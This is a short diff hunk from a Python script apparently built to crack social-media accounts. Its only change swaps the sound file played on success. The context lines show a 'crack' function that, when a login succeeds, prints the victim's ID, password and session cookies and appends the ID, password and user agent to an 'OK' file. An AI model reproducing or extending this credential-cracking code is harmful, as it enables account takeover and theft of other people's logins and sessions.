@@ -475,7 +475,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				os.system("play-audio AM.mp3 ")
+				os.system("play-audio y.mp3 ")
 				print(f'\r{H}\n TBS-SUCCESSFUL [💚] {idf} | {pw}\n [💉]COOKIES ➢ {kuki}\n [🚀]USER AGENT ➢ {ua}{N}')
 				cek_apk(session,coki)
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
